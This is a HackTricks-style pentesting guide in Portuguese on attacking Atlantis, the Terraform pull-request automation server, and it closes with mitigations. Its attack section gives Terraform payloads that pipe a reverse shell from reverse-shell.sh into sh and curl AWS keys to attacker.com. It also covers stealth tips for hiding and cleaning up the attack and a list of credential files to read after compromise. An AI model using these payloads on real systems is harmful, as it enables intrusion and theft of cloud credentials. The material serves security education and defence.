# Atlantis Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

Atlantis basicamente ajuda voc√™ a executar terraform a partir de Pull Requests do seu servidor git.

![](<../.gitbook/assets/image (161).png>)

### Local Lab

1. V√° para a **p√°gina de lan√ßamentos do atlantis** em [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) e **baixe** a que melhor se adequa a voc√™.
2. Crie um **token pessoal** (com acesso ao reposit√≥rio) do seu usu√°rio **github**
3. Execute `./atlantis testdrive` e isso criar√° um **reposit√≥rio de demonstra√ß√£o** que voc√™ pode usar para **conversar com atlantis**
1. Voc√™ pode acessar a p√°gina da web em 127.0.0.1:4141

### Atlantis Access

#### Git Server Credentials

**Atlantis** suporta v√°rios hosts git, como **Github**, **Gitlab**, **Bitbucket** e **Azure DevOps**.\
No entanto, para acessar os reposit√≥rios nessas plataformas e realizar a√ß√µes, √© necess√°rio ter algum **acesso privilegiado concedido a eles** (pelo menos permiss√µes de escrita).\
[**A documenta√ß√£o**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) recomenda criar um usu√°rio nessas plataformas especificamente para Atlantis, mas algumas pessoas podem usar contas pessoais.

{% hint style="warning" %}
Em qualquer caso, do ponto de vista de um atacante, a **conta Atlantis** ser√° uma **muito interessante** **para comprometer**.
{% endhint %}

#### Webhooks

Atlantis usa opcionalmente [**segredos de Webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) para validar que os **webhooks** que recebe do seu host Git s√£o **leg√≠timos**.

Uma maneira de confirmar isso seria **permitir que as solicita√ß√µes venham apenas dos IPs** do seu host Git, mas uma maneira mais f√°cil √© usar um Segredo de Webhook.

Observe que, a menos que voc√™ use um servidor privado do github ou bitbucket, voc√™ precisar√° expor os endpoints de webhook para a Internet.

{% hint style="warning" %}
Atlantis estar√° **expondo webhooks** para que o servidor git possa enviar informa√ß√µes. Do ponto de vista de um atacante, seria interessante saber **se voc√™ pode enviar mensagens** para ele.
{% endhint %}

#### Provider Credentials <a href="#provider-credentials" id="provider-credentials"></a>

[Da documenta√ß√£o:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis executa Terraform simplesmente **executando os comandos `terraform plan` e `apply`** no servidor **onde o Atlantis est√° hospedado**. Assim como quando voc√™ executa o Terraform localmente, o Atlantis precisa de credenciais para seu provedor espec√≠fico.

Cabe a voc√™ como [fornecer credenciais](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) para seu provedor espec√≠fico ao Atlantis:

* O [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) do Atlantis e o [M√≥dulo AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) t√™m seus pr√≥prios mecanismos para credenciais de provedor. Leia a documenta√ß√£o deles.
* Se voc√™ estiver executando o Atlantis em uma nuvem, muitas nuvens t√™m maneiras de conceder acesso √† API da nuvem para aplicativos que est√£o sendo executados nelas, ex:
* [AWS EC2 Roles](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Pesquise por "EC2 Role")
* [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Muitos usu√°rios definem vari√°veis de ambiente, ex. `AWS_ACCESS_KEY`, onde o Atlantis est√° sendo executado.
* Outros criam os arquivos de configura√ß√£o necess√°rios, ex. `~/.aws/credentials`, onde o Atlantis est√° sendo executado.
* Use o [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) para obter credenciais de provedor.

{% hint style="warning" %}
O **container** onde o **Atlantis** est√° **executando** provavelmente **cont√©m credenciais privilegiadas** para os provedores (AWS, GCP, Github...) que o Atlantis est√° gerenciando via Terraform.
{% endhint %}

#### Web Page

Por padr√£o, o Atlantis executar√° uma **p√°gina da web na porta 4141 no localhost**. Esta p√°gina apenas permite que voc√™ habilite/desabilite o atlantis apply e verifique o status do plano dos reposit√≥rios e os desbloqueie (n√£o permite modificar coisas, ent√£o n√£o √© t√£o √∫til).

Voc√™ provavelmente n√£o a encontrar√° exposta √† internet, mas parece que por padr√£o **nenhuma credencial √© necess√°ria** para acess√°-la (e se forem, `atlantis`:`atlantis` s√£o as **padr√µes**).

### Server Configuration

A configura√ß√£o para `atlantis server` pode ser especificada por meio de flags de linha de comando, vari√°veis de ambiente, um arquivo de configura√ß√£o ou uma mistura dos tr√™s.

* Voc√™ pode encontrar [**aqui a lista de flags**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) suportadas pelo servidor Atlantis
* Voc√™ pode encontrar [**aqui como transformar uma op√ß√£o de configura√ß√£o em uma vari√°vel de ambiente**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Os valores s√£o **escolhidos nesta ordem**:

1. Flags
2. Vari√°veis de Ambiente
3. Arquivo de Configura√ß√£o

{% hint style="warning" %}
Observe que na configura√ß√£o voc√™ pode encontrar valores interessantes, como **tokens e senhas**.
{% endhint %}

#### Repos Configuration

Algumas configura√ß√µes afetam **como os reposit√≥rios s√£o gerenciados**. No entanto, √© poss√≠vel que **cada reposit√≥rio exija configura√ß√µes diferentes**, ent√£o existem maneiras de especificar cada reposit√≥rio. Esta √© a ordem de prioridade:

1. Arquivo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Este arquivo pode ser usado para especificar como o atlantis deve tratar o reposit√≥rio. No entanto, por padr√£o, algumas chaves n√£o podem ser especificadas aqui sem algumas flags permitindo isso.
1. Provavelmente necess√°rio ser permitido por flags como `allowed_overrides` ou `allow_custom_workflows`
2. [**Configura√ß√£o do Lado do Servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Voc√™ pode pass√°-la com a flag `--repo-config` e √© um yaml configurando novas configura√ß√µes para cada reposit√≥rio (regexes suportados)
3. Valores **padr√£o**

**PR Protections**

Atlantis permite indicar se voc√™ deseja que o **PR** seja **`aprovado`** por outra pessoa (mesmo que isso n√£o esteja definido na prote√ß√£o de branch) e/ou ser **`mescl√°vel`** (prote√ß√µes de branch aprovadas) **antes de executar apply**. Do ponto de vista de seguran√ßa, definir ambas as op√ß√µes √© recomendado.

Caso `allowed_overrides` seja True, essas configura√ß√µes podem ser **sobrescritas em cada projeto pelo arquivo `/atlantis.yml`**.

**Scripts**

A configura√ß√£o do reposit√≥rio pode **especificar scripts** para serem executados [**antes**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_ganchos de pr√©-workflow_) e [**depois**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_ganchos de p√≥s-workflow_) de um **workflow ser executado.**

N√£o h√° nenhuma op√ß√£o para permitir **especificar** esses scripts no **arquivo de reposit√≥rio `/atlantis.yml`**.

**Workflow**

Na configura√ß√£o do reposit√≥rio (configura√ß√£o do lado do servidor), voc√™ pode [**especificar um novo workflow padr√£o**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ou [**criar novos workflows personalizados**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Voc√™ tamb√©m pode **especificar** quais **reposit√≥rios** podem **acessar** os **novos** gerados.\
Ent√£o, voc√™ pode permitir que o arquivo **atlantis.yaml** de cada reposit√≥rio **especifique o workflow a ser usado.**

{% hint style="danger" %}
Se a flag [**configura√ß√£o do lado do servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` estiver definida como **True**, os workflows podem ser **especificados** no arquivo **`atlantis.yaml`** de cada reposit√≥rio. Tamb√©m pode ser necess√°rio que **`allowed_overrides`** especifique tamb√©m **`workflow`** para **sobrescrever o workflow** que ser√° usado.\
Isso basicamente dar√° **RCE no servidor Atlantis para qualquer usu√°rio que puder acessar esse reposit√≥rio**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Verifica√ß√£o de Pol√≠ticas do Conftest**

Atlantis suporta a execu√ß√£o de **pol√≠ticas** [**conftest**](https://www.conftest.dev/) **do lado do servidor** contra a sa√≠da do plano. Casos de uso comuns para usar esta etapa incluem:

* Negar o uso de uma lista de m√≥dulos
* Afirmar atributos de um recurso no momento da cria√ß√£o
* Capturar exclus√µes acidentais de recursos
* Prevenir riscos de seguran√ßa (ou seja, expor portas seguras ao p√∫blico)

Voc√™ pode verificar como configur√°-lo na [**documenta√ß√£o**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

### Comandos do Atlantis

[**Na documenta√ß√£o**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) voc√™ pode encontrar as op√ß√µes que pode usar para executar o Atlantis:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### Ataques

{% hint style="warning" %}
Se durante a explora√ß√£o voc√™ encontrar este **erro**: `Error: Error acquiring the state lock`

Voc√™ pode corrigir isso executando:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - Modifica√ß√£o de configura√ß√£o em um novo PR

Se voc√™ tiver acesso de escrita a um reposit√≥rio, poder√° criar um novo branch nele e gerar um PR. Se voc√™ puder **executar `atlantis plan`** (ou talvez seja executado automaticamente) **voc√™ poder√° RCE dentro do servidor Atlantis**.

Voc√™ pode fazer isso fazendo [**Atlantis carregar uma fonte de dados externa**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Basta colocar um payload como o seguinte no arquivo `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Ataque Mais Discreto**

Voc√™ pode realizar este ataque de uma maneira **mais discreta**, seguindo estas sugest√µes:

* Em vez de adicionar o rev shell diretamente no arquivo terraform, voc√™ pode **carregar um recurso externo** que cont√©m o rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Voc√™ pode encontrar o c√≥digo rev shell em [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* No recurso externo, use o recurso **ref** para ocultar o **c√≥digo rev shell do terraform em um branch** dentro do reposit√≥rio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Em vez** de criar um **PR para master** para acionar o Atlantis, **crie 2 branches** (test1 e test2) e crie um **PR de um para o outro**. Quando voc√™ tiver conclu√≠do o ataque, apenas **remova o PR e os branches**.

#### Atlantis plan Secrets Dump

Voc√™ pode **extrair segredos usados pelo terraform** executando `atlantis plan` (`terraform plan`) colocando algo assim no arquivo terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Modifica√ß√£o de configura√ß√£o em um novo PR

Se voc√™ tiver acesso de escrita a um reposit√≥rio, poder√° criar um novo branch nele e gerar um PR. Se voc√™ puder **executar `atlantis apply`, voc√™ poder√° RCE dentro do servidor Atlantis**.

No entanto, voc√™ geralmente precisar√° contornar algumas prote√ß√µes:

* **Mergeable**: Se essa prote√ß√£o estiver definida no Atlantis, voc√™ s√≥ poder√° executar **`atlantis apply` se o PR for mergeable** (o que significa que a prote√ß√£o do branch precisa ser contornada).
* Verifique poss√≠veis [**contornos de prote√ß√µes de branch**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Aprovado**: Se essa prote√ß√£o estiver definida no Atlantis, **outro usu√°rio deve aprovar o PR** antes que voc√™ possa executar `atlantis apply`
* Por padr√£o, voc√™ pode abusar do [**token do Gitbot para contornar essa prote√ß√£o**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Executando **`terraform apply` em um arquivo Terraform malicioso com** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Voc√™ s√≥ precisa garantir que algum payload como os seguintes termine no arquivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Siga as **sugest√µes da t√©cnica anterior** para realizar este ataque de uma maneira **mais furtiva**.

#### Inje√ß√£o de Par√¢metros do Terraform

Ao executar `atlantis plan` ou `atlantis apply`, o terraform est√° sendo executado sob, voc√™ pode passar comandos para o terraform a partir do atlantis comentando algo como:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Algo que voc√™ pode passar s√£o vari√°veis de ambiente que podem ser √∫teis para contornar algumas prote√ß√µes. Verifique as vari√°veis de ambiente do terraform em [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

#### Fluxo de Trabalho Personalizado

Executando **comandos de build personalizados maliciosos** especificados em um arquivo `atlantis.yaml`. O Atlantis usa o arquivo `atlantis.yaml` do branch da pull request, **n√£o** do `master`.\
Essa possibilidade foi mencionada em uma se√ß√£o anterior:

{% hint style="danger" %}
Se a flag de [**configura√ß√£o do lado do servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` estiver definida como **True**, fluxos de trabalho podem ser **especificados** no arquivo **`atlantis.yaml`** de cada reposit√≥rio. Tamb√©m pode ser necess√°rio que **`allowed_overrides`** especifique tamb√©m **`workflow`** para **substituir o fluxo de trabalho** que ser√° utilizado.

Isso basicamente dar√° **RCE no servidor Atlantis para qualquer usu√°rio que puder acessar esse reposit√≥rio**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Bypass plan/apply protections

Se a flag de [**configura√ß√£o do lado do servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _tiver_ `apply_requirements` configurado, √© poss√≠vel que um reposit√≥rio **modifique as prote√ß√µes de plan/apply para contorn√°-las**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

Se algu√©m enviar **`atlantis plan/apply` coment√°rios em seus pull requests v√°lidos,** isso far√° com que o terraform seja executado quando voc√™ n√£o quiser.

Al√©m disso, se voc√™ n√£o tiver configurado na **prote√ß√£o de branch** para pedir para **reevaluar** cada PR quando um **novo commit √© enviado** para ele, algu√©m poderia **escrever configs maliciosas** (ver cen√°rios anteriores) na configura√ß√£o do terraform, executar `atlantis plan/apply` e obter RCE.

Esta √© a **configura√ß√£o** nas prote√ß√µes de branch do Github:

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

Se voc√™ conseguir **roubar o webhook secret** usado ou se **n√£o houver nenhum webhook secret** sendo usado, voc√™ poderia **chamar o webhook do Atlantis** e **invocar comandos do atlantis** diretamente.

#### Bitbucket

O Bitbucket Cloud **n√£o suporta webhook secrets**. Isso poderia permitir que atacantes **falsificassem solicita√ß√µes do Bitbucket**. Certifique-se de permitir apenas IPs do Bitbucket.

* Isso significa que um **atacante** poderia fazer **solicita√ß√µes falsas para o Atlantis** que parecem estar vindo do Bitbucket.
* Se voc√™ estiver especificando `--repo-allowlist`, ent√£o eles poderiam apenas falsificar solicita√ß√µes relacionadas a esses reposit√≥rios, ent√£o o maior dano que poderiam causar seria planejar/aplicar em seus pr√≥prios reposit√≥rios.
* Para evitar isso, adicione √† lista de permiss√µes [os endere√ßos IP do Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (veja Endere√ßos IPv4 de sa√≠da).

### Post-Exploitation

Se voc√™ conseguiu acessar o servidor ou pelo menos obteve um LFI, h√° algumas coisas interessantes que voc√™ deve tentar ler:

* `/home/atlantis/.git-credentials` Cont√©m credenciais de acesso ao vcs
* `/atlantis-data/atlantis.db` Cont√©m credenciais de acesso ao vcs com mais informa√ß√µes
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Arquivo de estado do Terraform
* Exemplo: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Vari√°veis de ambiente
* `/proc/[2-20]/cmdline` Linha de comando do `atlantis server` (pode conter dados sens√≠veis)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Porque qualquer um pode comentar em pull requests p√∫blicos, mesmo com todas as mitigations de seguran√ßa dispon√≠veis, ainda √© perigoso executar o Atlantis em reposit√≥rios p√∫blicos sem a configura√ß√£o adequada das configura√ß√µes de seguran√ßa.

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Se voc√™ estiver executando em um reposit√≥rio p√∫blico (o que n√£o √© recomendado, veja acima), voc√™ n√£o deve definir `--allow-fork-prs` (o padr√£o √© falso) porque qualquer um pode abrir um pull request de seu fork para o seu reposit√≥rio.

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

O Atlantis exige que voc√™ especifique uma lista de permiss√µes de reposit√≥rios dos quais aceitar√° webhooks atrav√©s da flag `--repo-allowlist`. Por exemplo:

* Reposit√≥rios espec√≠ficos: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Sua organiza√ß√£o inteira: `--repo-allowlist=github.com/runatlantis/*`
* Todos os reposit√≥rios na sua instala√ß√£o do GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Todos os reposit√≥rios: `--repo-allowlist=*`. √ötil quando voc√™ est√° em uma rede protegida, mas perigoso sem tamb√©m definir um webhook secret.

Essa flag garante que sua instala√ß√£o do Atlantis n√£o esteja sendo usada com reposit√≥rios que voc√™ n√£o controla. Veja `atlantis server --help` para mais detalhes.

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Se atacantes estiverem enviando pull requests com c√≥digo malicioso do Terraform em seu modelo de amea√ßa, ent√£o voc√™ deve estar ciente de que as aprova√ß√µes de `terraform apply` n√£o s√£o suficientes. √â poss√≠vel executar c√≥digo malicioso em um `terraform plan` usando a [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ou especificando um provedor malicioso. Esse c√≥digo poderia ent√£o exfiltrar suas credenciais.

Para evitar isso, voc√™ poderia:

1. Incorporar provedores na imagem do Atlantis ou hospedar e negar egress em produ√ß√£o.
2. Implementar o protocolo de registro de provedores internamente e negar egress p√∫blico, assim voc√™ controla quem tem acesso de escrita ao registro.
3. Modificar a etapa `plan` da sua [configura√ß√£o de reposit√≥rio do lado do servidor](https://www.runatlantis.io/docs/server-side-repo-config.html) para validar contra o uso de provedores ou fontes de dados n√£o permitidos ou PRs de usu√°rios n√£o permitidos. Voc√™ tamb√©m poderia adicionar valida√ß√£o extra neste ponto, por exemplo, exigindo um "thumbs-up" no PR antes de permitir que o `plan` continue. O Conftest poderia ser √∫til aqui.

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

O Atlantis deve ser executado com Webhook secrets definidos atrav√©s das vari√°veis de ambiente `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Mesmo com a flag `--repo-allowlist` definida, sem um webhook secret, atacantes poderiam fazer solicita√ß√µes ao Atlantis se passando por um reposit√≥rio que est√° na lista de permiss√µes. Webhook secrets garantem que as solicita√ß√µes de webhook est√£o realmente vindo do seu provedor de VCS (GitHub ou GitLab).

Se voc√™ estiver usando Azure DevOps, em vez de webhook secrets, adicione um nome de usu√°rio e senha b√°sicos.

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

O Azure DevOps suporta o envio de um cabe√ßalho de autentica√ß√£o b√°sica em todos os eventos de webhook. Isso requer o uso de uma URL HTTPS para sua localiza√ß√£o de webhook.

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Se voc√™ estiver usando webhook secrets, mas seu tr√°fego estiver sobre HTTP, ent√£o os webhook secrets poderiam ser roubados. Ative SSL/HTTPS usando as flags `--ssl-cert-file` e `--ssl-key-file`.

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

√â altamente recomendado habilitar a autentica√ß√£o no servi√ßo web. Ative o BasicAuth usando `--web-basic-auth=true` e configure um nome de usu√°rio e uma senha usando as flags `--web-username=yourUsername` e `--web-password=yourPassword`.

Voc√™ tamb√©m pode passar isso como vari√°veis de ambiente `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` e `ATLANTIS_WEB_PASSWORD=yourPassword`.

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
